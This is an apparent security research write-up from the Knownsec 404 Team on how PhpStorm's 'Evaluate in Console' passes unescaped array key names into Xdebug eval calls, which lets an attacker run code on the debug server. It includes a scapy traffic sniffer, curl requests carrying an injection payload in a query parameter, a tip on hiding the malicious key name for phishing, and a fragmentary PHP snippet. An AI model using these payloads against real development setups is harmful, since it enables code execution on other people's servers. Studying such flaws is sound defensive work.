**Author: dawu@Knownsec 404 Team**  
**Date: August 16, 2018**  
**Chinese Version:**
### 0x00 Why Xdebug Caught My Attention
I met a large array `$form` when I was debugging Drupal remote code execution
vulnerability (CVE-2018-7600 & CVE-2018-7602) with PhpStorm.
As a security researcher, I hope to explore vulnerabilities when debugging, so
it’s important to know the content of each element in `$form`. However,
PhpStorm is a debugging tool that requires a lot of clicks to see the value of
each element in the array, which is very inefficient.
I found a solution in the official manual:
However, `Evaluate in Console` seems to be very dangerous, so I deeply studied
the implementation process of this function and successfully executed the
command on `Xdebug` server through `PhpStorm`.
### 0x01 Preparations
#### 1.1 The Working Principles and Potential Attack Surface of Xdebug
There have been articles about its working principle and potential attack
surface:
  * [Xdebug: A Tiny Attack Surface](https://paper.seebug.org/397/)
  * [利用恶意页面攻击本地Xdebug](https://paper.seebug.org/558/)
Based on the above reference links, the known attack surfaces are:
  1. `eval` command: Be able to execute the code. 
  2. `property_set && property_get` command: Be able to execute the code. 
  3. `source` command: Be able to read the source code. 
  4. The local Xdebug server may be attacked by using DNS rebinding technique.
For this paper, the debugging workflow of PhpStorm and Xdebug is as follows:
  1. PhpStorm starts debugging monitor, and binds ports 9000, 10137 and 20080 by default to wait for connection.
  2. Developers use `XDEBUG_SESSION=PHPSTORM` to access PHP pages. The content of `XDEBUG_SESSION` can be configured, and I set `PHPSTORM`.
  3. The Xdebug server is backconnected to port 9000 where PhpStorm monitors.
  4. By establishing the connection in step 3, developers can read the source code, set breakpoints, execute code, and so on.
If we can control the command used by PhpStorm during debugging, then the
attack surface 1, 2 and 3 in step 4 will directly threaten the security of
Xdebug server.
#### 1.2 Development of Real-Time Sniffer Script
As an old saying goes like this, a handy tool makes a handy man. I developed a
script to show the traffic that PhpStorm and Xdebug interact with in real time
(this script will appear several times in the screenshot below).
    from scapy.all import *
    import base64
    Terminal_color = {
        "DEFAULT": "\033[0m",
        "RED": "\033[1;31;40m"
    }
    def pack_callback(packet):
        try:
            if packet[TCP].payload.raw_packet_cache != None:
                print("*"* 200)
                print("%s:%s --> %s:%s " %(packet['IP'].src,packet.sport,packet['IP'].dst,packet.dport))
                print(packet[TCP].payload.raw_packet_cache.decode('utf-8'))
                if packet[TCP].payload.raw_packet_cache.startswith(b"eval"):
                    print("%s[EVAL] %s %s"%(Terminal_color['RED'],base64.b64decode(packet[TCP].payload.raw_packet_cache.decode('utf-8').split("--")[1].strip()).decode('utf-8'),Terminal_color['DEFAULT']))
                if packet[TCP].payload.raw_packet_cache.startswith(b"property_set"):
                    variable = ""
                    for i in packet[TCP].payload.raw_packet_cache.decode('utf-8').split(" "):
                        if "$" in i:
                            variable = i
                    print("%s[PROPERTY_SET] %s=%s %s"%(Terminal_color['RED'],variable,base64.b64decode(packet[TCP].payload.raw_packet_cache.decode('utf-8').split("--")[1].strip()).decode('utf-8'),Terminal_color['DEFAULT']))
                if b"command=\"eval\"" in packet[TCP].payload.raw_packet_cache:
                    raw_data = packet[TCP].payload.raw_packet_cache.decode('utf-8')
                    CDATA_postion = raw_data.find("CDATA")
                    try:
                        eval_result = base64.b64decode(raw_data[CDATA_postion+6:CDATA_postion+raw_data[CDATA_postion:].find("]")])
                        print("%s[CDATA] %s %s"%(Terminal_color['RED'],eval_result,Terminal_color['DEFAULT']))
                    except:
                        pass
        except Exception as e:
            print(e)
            print(packet[TCP].payload)
    dpkt  = sniff(iface="vmnet5",filter="tcp", prn=pack_callback)
### 0x02 Execute Commands on the Xdebug Server via PhpStorm
#### 2.1 Execute Commands via Evaluate in Console
From the script above, it's clear what happens when we execute the `Evaluate
in Console` command (the decoded result of `base64` is in red).
If we can control `$q`, then we can control the content of `eval`, but in the
[official PHP manual](http://php.net/manual/en/language.variables.basics.php
"official PHP manual"), it's clear that variable names should be composed of
`a-za-z_ \x7f-\ XFF`:
> Variable names follow the same rules as other labels in PHP. A valid
> variable name starts with a letter or underscore, followed by any number of
> letters, numbers, or underscores. As a regular expression, it would be
> expressed thus: '[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*'
So it is not realistic to control the content of `eval` by controlling `$q`.
But when PhpStorm gets an element in the array, it takes the name of that
element into the eval statement.
As shown below, define the array as `$a = ( "aaa'bbb"=>"ccc")`, and use
`Evaluate in Console` in PhpStorm.
You can see that the single quotes are not filtered, which means I can control
the contents of `eval`. In the picture below, I get the value of `$a['aaa']`
by using `Evaluate in Console` on the `$a['aaa\'];#']` variable.
The carefully constructed request and code are as follows:
    $ curl "http://192.168.88.128/first_pwn.php?q=a%27%5d(\$b);%09%23" --cookie "XDEBUG_SESSION=PHPSTORM"
    > /tmp/dawu";
    $a[$q] = "aaa";
    echo $a;
    ?>
But there's an obvious flaw in this example: you can see malicious element
names. If used for phishing attacks, the success rate will be greatly reduced,
so the above code has been modified:
    $ curl "http://192.168.88.128/second_pwn.php?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%27%5d(\$b);%09%23" --cookie "XDEBUG_SESSION=PHPSTORM"
    <?php